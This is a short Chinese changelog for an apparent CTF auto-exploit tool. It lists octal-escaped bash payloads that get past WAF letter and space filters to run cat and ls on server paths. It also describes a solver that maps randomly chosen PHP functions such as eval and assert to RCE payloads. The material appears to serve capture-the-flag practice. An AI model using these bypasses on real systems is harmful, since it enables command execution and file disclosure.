## 新增功能（2个）

### 1. 八进制 WAF 绕过 Payload
| Payload | 等价 | 场景 |
|---------|------|------|
| `$'\143\141\164' /????` | `cat /????` | 字母黑名单（空格允许） |
| `$'\143\141\164'$'\11'/????` | `cat<tab>/????` | 字母+空格双WAF |
| `$'\154\163' /` | `ls /` | 列级目录 |

### 2. PHP 动态函数执行解题器
RCE-labs 特有题型：Session 随机选函数 → 用户 POST 参数执行。
新增 `_try_php_dynamic_func()` 函数：
- 检测指纹：`get_fun` + `hello_ctf` 模式
- Session 管理：CookieJar 保持会话
- 随机函数识别：10种函数 自动匹配
- 函数-Payload 映射表：`_PHP_FUNC_MAP`（eval/assert/array_map/... 共10种）
- 调用位置：auto_exploit → 并发攻击后 → 静态扫描后 → **PHP动态执行**
